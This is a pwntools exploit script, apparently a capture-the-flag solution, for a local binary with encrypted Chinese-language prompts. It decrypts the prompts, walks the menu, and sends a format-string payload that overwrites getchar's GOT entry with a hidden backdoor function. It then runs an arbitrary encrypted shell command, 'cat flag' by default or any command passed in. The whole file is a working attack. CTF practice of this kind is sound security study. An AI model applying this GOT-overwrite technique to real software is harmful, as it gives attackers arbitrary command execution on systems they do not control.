#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
exe = ELF('./pwn', checksec=False)

HOST, PORT = '127.0.0.1', 13187
PATH = [b'cat flag', b'1', b'1', b'2', b'3', b'2', b'1', b'1']
GETCHAR_GOT = exe.got['getchar']
BACKDOOR = exe.sym['hidden_backdoor_system']


def rotl8(x, n):
    x &= 0xff
    return ((x << n) | (x >> (8 - n))) & 0xff if n else x


def dec(blk, key):
    return bytes(c ^ key[i] for i, c in enumerate(blk)).split(b'\x00', 1)[0]


def kbyte(key, i):
    a = key[(11 * i + 17) & 0x7f]
    b = key[(13 * i + 29) & 0x7f]
    c = key[(7 * i + 3) & 0x7f] ^ ((61 * i + 39) & 0xff)
    return ((a + 65) ^ rotl8(c, i & 7) ^ (b >> (i % 3 + 1))) & 0xff


def enc_cmd(key, s):
    s = s if isinstance(s, bytes) else s.encode()
    return bytes(ch ^ kbyte(key, i) for i, ch in enumerate(s)).hex().encode()


def start():
    if args.REMOTE:
        return remote(args.HOST or HOST, int(args.PORT or PORT))
    return process(['setarch', 'x86_64', '-R', exe.path])


def main():
    io = start()
    key = io.recvn(128)
    cmd = args.CMD or 'cat flag'

    # snprintf(dst, 0x1000, user) with zeroed dst gives a self-referential fmt primitive:
    # arg6 == first qword of dst. Forge getchar@GOT there and %6$hn -> backdoor.
    pay = p64(GETCHAR_GOT)[:3]
    pay += f'%1${(BACKDOOR & 0xffff) - len(pay)}c%6$hn'.encode()

    it = iter(PATH)
    while True:
        msg = dec(io.recvn(128), key).decode('utf-8', 'ignore')
        print(msg)
        if '请输入你的名字' in msg or '你的选择是？' in msg:
            io.sendline(next(it))
        elif '把想说的话告诉她' in msg:
            io.sendline(pay)
        elif '按回车键离开' in msg:
            io.sendline(enc_cmd(key, cmd))
            break

    print(io.recvrepeat(1).decode('utf-8', 'ignore'), end='')


if __name__ == '__main__':
    main()
